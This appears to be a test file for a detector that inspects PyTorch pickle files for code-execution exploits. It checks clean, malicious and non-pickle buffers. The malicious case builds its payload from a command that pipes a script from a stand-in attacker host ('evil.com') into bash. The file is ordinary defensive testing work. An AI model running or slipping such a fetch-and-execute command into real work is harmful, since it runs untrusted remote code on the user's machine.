// ============================================================================
// TESTS: PYTORCH PICKLE SECURITY & EXPLOIT DETECTOR
// ============================================================================

import { describe, it, expect } from "bun:test";
import { SecurityRisk } from "../src/types.js";
import {
  inspectPickleBuffer,
  createCleanPyTorchPicklePayload,
  createMaliciousPicklePayload,
} from "../src/binary/pickle-inspector.js";

describe("PyTorch Pickle Security Inspector", () => {
  it("recognizes legitimate PyTorch state dict and flags general pickle warning", () => {
    const cleanBuffer = createCleanPyTorchPicklePayload();
    const report = inspectPickleBuffer(cleanBuffer);

    expect(report.hasPickleMagic).toBe(true);
    expect(report.protocolVersion).toBe(2);
    expect(report.isExploitDetected).toBe(false);
    expect(report.globalImports.length).toBe(1);
    expect(report.globalImports[0].module).toBe("collections");
    expect(report.globalImports[0].name).toBe("OrderedDict");
    expect(report.globalImports[0].isDangerous).toBe(false);
  });

  it("detects malicious arbitrary code execution exploit payloads", () => {
    const exploitPayload = createMaliciousPicklePayload("curl evil.com/rce.sh | bash");
    const report = inspectPickleBuffer(exploitPayload);

    expect(report.hasPickleMagic).toBe(true);
    expect(report.isExploitDetected).toBe(true);
    expect(report.securityRisk).toBe(SecurityRisk.ARBITRARY_CODE_EXECUTION);
    expect(report.exploitExplanation).toContain("Malicious import detected: 'os.system'");
    expect(report.dangerousOpcodeEvents.length).toBeGreaterThan(0);

    const globalEvent = report.dangerousOpcodeEvents.find((e) => e.opcodeName === "GLOBAL");
    expect(globalEvent).toBeDefined();
    expect(globalEvent?.argument).toBe("os.system");
  });

  it("handles non-pickle raw data buffers without throwing", () => {
    const randomBytes = new Uint8Array([0x12, 0x34, 0x56, 0x78]);
    const report = inspectPickleBuffer(randomBytes);

    expect(report.hasPickleMagic).toBe(false);
    expect(report.isExploitDetected).toBe(false);
    expect(report.securityRisk).toBe(SecurityRisk.SAFE);
  });
});
